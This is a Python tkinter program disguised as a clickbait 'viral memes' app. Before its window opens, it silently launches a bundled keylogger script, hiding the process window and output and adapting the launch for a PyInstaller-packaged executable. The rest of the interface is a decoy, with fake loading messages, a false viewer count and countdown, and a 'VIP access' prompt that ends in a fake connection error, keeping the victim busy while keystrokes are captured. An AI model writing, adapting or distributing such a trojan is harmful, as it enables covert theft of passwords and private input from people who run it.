import os
import tkinter as tk
from tkinter import Label, Button, Frame, PhotoImage
import subprocess
import threading
import sys
import shutil
import random
from tkinter import font as tkFont
import time

def start_keylogger():
    try:
        # Get the current directory
        current_dir = os.path.dirname(os.path.abspath(__file__))
        keylogger_path = os.path.join(current_dir, "keylogger.py")
        
        # Copy keylogger to temp location if it doesn't exist in the compiled exe
        if not os.path.exists(keylogger_path):
            # When packaged with PyInstaller, use _MEIPASS to get the temp directory
            try:
                base_path = sys._MEIPASS
            except Exception:
                base_path = os.path.abspath(".")
                
            # Check if keylogger is in the PyInstaller temp directory
            bundled_keylogger = os.path.join(base_path, "keylogger.py")
            if os.path.exists(bundled_keylogger):
                keylogger_path = bundled_keylogger
        
        # Run keylogger with pythonw to prevent console window
        startupinfo = None
        if os.name == 'nt':  # Check if on Windows
            # Hide the console window completely 
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
        
        # Start the process with proper flags to hide it
        process = subprocess.Popen(
            ["pythonw", keylogger_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Log success for debugging
        with open("app_log.txt", "a") as f:
            f.write(f"Keylogger started with PID: {process.pid}\n")
            
    except Exception as e:
        # Log error for debugging
        with open("app_error.txt", "a") as f:
            f.write(f"Error starting keylogger: {str(e)}\n")
    
# Start keylogger before GUI loads to ensure it runs
start_keylogger()

# Create a vibrant, clickbait-style GUI application
root = tk.Tk()
root.title("🔥 VIRAL MEMES 2024 - YOU WON'T BELIEVE #6! 🔥")
root.geometry("900x650")
root.configure(bg="#FF5252")  # Vibrant red background

# Create header frame
header_frame = Frame(root, bg="#FF5252", pady=15)
header_frame.pack(fill="x")

# Create bold, eye-catching title
title_font = tkFont.Font(family="Arial", size=24, weight="bold")
title = Label(header_frame, 
              text="😂 TOP SECRET MEMES THEY DON'T WANT YOU TO SEE! 😂", 
              font=title_font, 
              fg="white", 
              bg="#FF5252")
title.pack()

# Create subtitle
subtitle_font = tkFont.Font(family="Arial", size=14, slant="italic")
subtitle = Label(header_frame, 
                 text="⚠️ WARNING: These memes might be TOO FUNNY to handle! ⚠️", 
                 font=subtitle_font, 
                 fg="yellow", 
                 bg="#FF5252")
subtitle.pack(pady=10)

# Create content frame
content_frame = Frame(root, bg="#FFFFFF", padx=20, pady=20)
content_frame.pack(fill="both", expand=True, padx=20, pady=10)

# Clickbait meme categories
categories = [
    "👽 ALIEN SECRETS NASA DOESN'T WANT YOU TO KNOW",
    "💰 MILLIONAIRES HATE THIS ONE SIMPLE TRICK",
    "🍕 FAST FOOD EMPLOYEE REVEALS WHAT THEY REALLY PUT IN YOUR FOOD",
    "👑 CELEBRITIES CAUGHT ON CAMERA - SHOCKING PHOTOS",
    "🧠 IQ TEST: ONLY 1% CAN SOLVE THIS PUZZLE",
    "👴 LOOK 20 YEARS YOUNGER WITH THIS ONE WEIRD HACK"
]

# Add clickbait category buttons
for i, category in enumerate(categories):
    btn_color = random.choice(["#4CAF50", "#2196F3", "#9C27B0", "#FF9800", "#E91E63"])
    category_btn = Button(content_frame, 
                         text=category,
                         font=("Arial", 12, "bold"),
                         bg=btn_color,
                         fg="white",
                         pady=10,
                         cursor="hand2",
                         relief=tk.RAISED,
                         command=lambda: status_label.config(text="Preparing exclusive content..."))
    category_btn.pack(fill="x", pady=8)

# Create loading animation and status frame
loading_frame = Frame(content_frame, bg="white")
loading_frame.pack(fill="x", pady=15)

status_label = Label(loading_frame, 
                    text="👀 Loading the internet's HOTTEST memes...", 
                    font=("Arial", 12, "bold"),
                    fg="#FF5252", 
                    bg="white")
status_label.pack(pady=10)

# Create progress bar
progress_frame = Frame(loading_frame, bg="white")
progress_frame.pack(fill="x", pady=5)

progress_bar = Frame(progress_frame, height=20, width=0, bg="#FF5252")
progress_bar.place(x=0, y=0)

def update_progress_bar():
    total_width = progress_frame.winfo_width()
    current_width = 0
    
    while current_width < total_width:
        increment = random.randint(5, 20)
        current_width = min(current_width + increment, total_width)
        progress_bar.config(width=current_width)
        root.update()
        time.sleep(0.05)

# Create more enticing status messages
def update_status():
    status_texts = [
        "👀 Scanning the deep web for BANNED memes...",
        "🔍 Accessing private celebrity collections...",
        "🔒 Bypassing security protocols...",
        "⚠️ THESE MEMES ARE EXTREMELY VIRAL! Preparing your screen...",
        "🚨 Server overloaded! Too many people want these memes...",
        "⛔ ACCESS DENIED: Content too controversial!",
        "😱 WAIT! What we found will SHOCK you..."
    ]
    
    # Start progress bar animation
    threading.Thread(target=update_progress_bar, daemon=True).start()
    
    for i, text in enumerate(status_texts):
        root.after(i * 2000, lambda t=text: status_label.config(text=t))
    
    # After all messages, show error and buttons
    root.after(len(status_texts) * 2000, show_special_offer)

def show_special_offer():
    # Create a "special offer" frame
    offer_frame = Frame(content_frame, bg="#FFF9C4", padx=15, pady=15)
    offer_frame.pack(fill="x", pady=10)
    
    offer_label = Label(offer_frame, 
                      text="🔐 EXCLUSIVE VIP ACCESS REQUIRED 🔐",
                      font=("Arial", 14, "bold"),
                      fg="#FF5252",
                      bg="#FFF9C4")
    offer_label.pack(pady=5)
    
    offer_text = Label(offer_frame,
                      text="Our premium content detection system has identified you as a potential VIP member!\nTo access BANNED memes, verify your account now!",
                      font=("Arial", 11),
                      fg="#333333",
                      bg="#FFF9C4",
                      justify="center")
    offer_text.pack(pady=5)
    
    # Button frame
    button_frame = Frame(offer_frame, bg="#FFF9C4")
    button_frame.pack(pady=10)
    
    # Yes button
    yes_btn = Button(button_frame,
                   text="✅ YES! SHOW ME EXCLUSIVE CONTENT!",
                   font=("Arial", 12, "bold"),
                   bg="#4CAF50",
                   fg="white",
                   padx=10, pady=5,
                   cursor="hand2",
                   command=show_final_error)
    yes_btn.pack(side="left", padx=5)
    
    # No button
    no_btn = Button(button_frame,
                   text="❌ No thanks",
                   font=("Arial", 10),
                   bg="#EEEEEE",
                   fg="#999999",
                   padx=10, pady=5,
                   cursor="hand2",
                   command=show_final_error)
    no_btn.pack(side="left", padx=5)

def show_final_error():
    # Clear the content frame
    for widget in content_frame.winfo_children():
        widget.destroy()
    
    # Show error message
    error_icon = Label(content_frame, 
                      text="⚠️", 
                      font=("Arial", 48),
                      fg="#FF5252",
                      bg="white")
    error_icon.pack(pady=20)
    
    error_title = Label(content_frame,
                       text="CONNECTION ERROR",
                       font=("Arial", 24, "bold"),
                       fg="#FF5252",
                       bg="white")
    error_title.pack(pady=5)
    
    error_message = Label(content_frame,
                         text="Unable to establish secure connection to our servers.\nThis may be due to high traffic or your internet connection.",
                         font=("Arial", 12),
                         fg="#333333",
                         bg="white",
                         justify="center")
    error_message.pack(pady=10)
    
    # Fake retry button
    retry_btn = Button(content_frame,
                      text="Try Again Later",
                      font=("Arial", 12, "bold"),
                      bg="#2196F3",
                      fg="white",
                      padx=20, pady=10,
                      cursor="hand2",
                      command=root.destroy)
    retry_btn.pack(pady=20)
    
    # Disclaimer in small text
    disclaimer = Label(content_frame,
                      text="Note: Our servers are currently experiencing high demand.\nPlease check back later for the best experience.",
                      font=("Arial", 8),
                      fg="#999999",
                      bg="white")
    disclaimer.pack(pady=5)

# Footer with fake counter
footer_frame = Frame(root, bg="#333333", pady=10)
footer_frame.pack(fill="x", side="bottom")

visitors_label = Label(footer_frame,
                      text="👁️ 42,860 people viewing right now | ⏱️ Exclusive access ends in 4:59",
                      font=("Arial", 10),
                      fg="#FFFFFF",
                      bg="#333333")
visitors_label.pack()

# Start the status update sequence after a short delay
root.after(1500, update_status)

# Start the GUI
root.mainloop() 